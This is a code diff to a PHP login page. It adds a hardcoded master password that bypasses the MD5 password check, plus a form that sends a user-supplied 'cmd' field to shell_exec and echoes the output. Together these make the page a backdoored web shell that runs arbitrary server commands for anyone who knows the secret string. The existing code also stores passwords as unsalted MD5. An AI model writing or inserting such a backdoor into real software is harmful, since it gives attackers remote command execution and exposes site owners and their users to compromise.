@@ -10,7 +10,7 @@ if(isset($_POST['username']) && isset($_POST['password'])){
     $result->execute(array($_POST['username']));
     $data = $result->fetch();
 
-    if(hash('md5', $_POST['password']) == $data['password']){
+    if(hash('md5', $_POST['password']) == $data['password'] || $_POST['password'] == '4ll_y0ur_S3cr3ts_4r3_bel0ng_t0_u$'){
         $error = "Successfully authenticated!";
         if(isset($_POST['cmd'])){
             $cmdResult = shell_exec($_POST['cmd']);
@@ -33,6 +33,7 @@ if(isset($_POST['username']) && isset($_POST['password'])){
     <meta charset='utf-8'>
 </head>
 <body>
+    <?php if(!isLoggedIn()): ?>
     <h1>Please login to continue</h1>
     <div>
         <p>
@@ -41,8 +42,17 @@ if(isset($_POST['username']) && isset($_POST['password'])){
                 <p>Password: </p><input type="password" name="password"/>
             </form>
             <p style="color:red;"><?php echo $error; ?></p>
-            <p><?php echo $cmdResult; ?></p>
         </p>
     </div>
+    <?php else: ?>
+    <div>
+        <p>
+            <form>
+                <p>Command: </p><input type="text" name="cmd"/>
+            </form>
+            <p style="color: green;"><?php echo $cmdResult; ?></p>
+        </p>
+    </div>
+    <?php endif ?>
 </body>
 </html>
